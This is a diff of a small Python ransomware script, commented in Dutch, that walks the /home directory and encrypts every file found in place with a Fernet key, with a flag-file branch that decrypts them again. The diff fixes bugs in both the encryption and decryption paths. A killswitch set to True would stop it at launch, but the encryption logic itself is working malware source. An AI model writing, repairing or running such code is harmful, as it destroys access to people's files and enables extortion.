@@ -3,13 +3,16 @@ from cryptography.fernet import Fernet
 
 #Killswitch Functie
 Killswitch = True
-
 if Killswitch==True:
     exit()
 else:
     pass
 
-check = open("Decrypt.txt", "r")
+try:
+   check = open("Decrypt.txt", "r")
+   check_1 = 1
+except:
+   check_1 = 0
 
 #Hier zoek functie
 #Def var voor opslaan van lijstdata van zoekfunctie.
@@ -22,25 +25,30 @@ for dirpath, dirs, files in os.walk('/home'):
       bestandenlijst.append(fname)
 
 #Decrypt
-if check == 1:
-   with open('key.txt', 'rb') as f:
+if check_1 == 1:
+   print("DEcrypt")
+   with open('Key.txt', 'rb') as f:
       key = f.read()
-      f = Fernet(key)
+      crypto = Fernet(key)
    for file in bestandenlijst:
-      with open(file, 'rb') as f:
-         file_inhoud = f.read()
-      ontsleutelde_inhoud = f.decrypt(file_inhoud)
-      with open(file, 'wb') as f:
-         f.write(ontsleutelde_inhoud)
+      try:
+         with open(file, 'rb') as f:
+            file_inhoud = f.read()
+         ontsleutelde_inhoud = crypto.decrypt(file_inhoud)
+         with open(file, 'wb') as f:
+            f.write(ontsleutelde_inhoud)
+      except Exception as e:
+         print(f"❌ Fout bij {file}: {e}")
 else:
    #Encryptiefunctie gebaseerd op lijst.
-    with open('key.txt', 'rb') as f:
+    print("Encrypt")
+    with open('Key.txt', 'rb') as f:
        key = f.read()
-       f = Fernet(key)
+       crypto = Fernet(key)
     for file in bestandenlijst:
         with open(file, 'rb') as f:
             file_inhoud = f.read()
-        versleutelde_data = f.encrypt(file_inhoud)
+        versleutelde_data = crypto.encrypt(file_inhoud)
         with open(file, 'wb') as f:
             f.write(versleutelde_data)
 
@@ -51,7 +59,7 @@ Readme.close()
 
 #Decryptfile
 Decrypt = open("Decrypt.txt","w")
-Decrypt.write("1")
+Decrypt.write("True")
 Decrypt.close()
 
 #Endstage
